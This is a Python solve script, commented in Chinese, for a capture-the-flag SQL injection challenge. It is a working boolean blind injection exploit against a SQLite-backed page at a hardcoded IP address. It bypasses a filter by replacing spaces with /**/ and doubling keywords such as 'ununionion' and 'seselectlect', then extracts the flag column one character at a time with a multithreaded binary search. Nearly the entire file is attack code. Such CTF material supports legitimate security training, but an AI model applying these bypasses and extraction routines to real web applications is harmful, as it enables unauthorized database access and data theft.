# -*- coding: utf-8 -*-
"""火影的注入 — 过滤型 SQLite 布尔盲注（一次过滤 + 空格剥离）

过滤规则（题目自述"每道封印只能生效一次"）：
  * 空格被删                  -> 用 /**/ 代替
  * union/select/and/or 各只删一次 -> 双写绕过 ununionion / seselectlect / anandd / oorr
  * 实测 `id` 也会被吃掉       -> 别写 cid / rowid

布尔 oracle：页面出现 class="archive-img" = 有结果行 = TRUE

用法: python solve_sqli.py http://IP:PORT
"""
import sys
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33704"


def send(payload: str) -> bool:
    """payload 写真实 SQL（含空格），这里统一做『空格 -> /**/』替换后发出"""
    q = payload.replace(" ", "/**/")
    try:
        with urllib.request.urlopen(BASE + "/?id=" + urllib.parse.quote(q), timeout=20) as r:
            return "archive-img" in r.read().decode("utf-8", "replace")
    except Exception:
        return False


def blind(sel_cols: str, frm: str, cond: str) -> bool:
    return send(f"-1' ununionion seselectlect {sel_cols} from {frm} where {cond}-- -")


def one_char(args):
    """二分出 expr 第 pos 位的字符；返回 None 表示已到末尾"""
    expr, frm, pos = args
    if not blind("1,2,3", frm, f"unicode(substr(({expr}),{pos},1))>31"):
        return None
    lo, hi = 31, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if blind("1,2,3", frm, f"unicode(substr(({expr}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def dump(expr: str, frm: str, maxlen: int = 80, workers: int = 12) -> str:
    tasks = [(expr, frm, p) for p in range(1, maxlen + 1)]
    with ThreadPoolExecutor(workers) as ex:
        res = list(ex.map(one_char, tasks))
    out = []
    for c in res:
        if c is None:
            break
        out.append(c)
    return "".join(out)


if __name__ == "__main__":
    print("[0] 基线 id=1 ->", send("1"), "| id=0 ->", send("0"))

    print("[1] 列数：", {n: blind(",".join(["1"] * n), "archives", "1") for n in (1, 2, 3, 4)})

    print("[2] 存在的表：", [t for t in ("archives", "scrolls", "sqlite_master", "flag")
                             if blind("1,2,3", t, "1")])

    print("[3] 定位存 flag 的列（列名靠猜，猜错 SQL 报错 -> FALSE）：")
    target = None
    for c in ("name", "title", "content", "secret", "flag", "note", "text"):
        if blind("1,2,3", "scrolls", f"{c} like 'HTUCTF%'"):
            target = c
            print("    hit -> scrolls." + c)
            break

    if target:
        print(f"[4] 提取 scrolls.{target}：")
        print("    " + dump(target, "scrolls", 80))
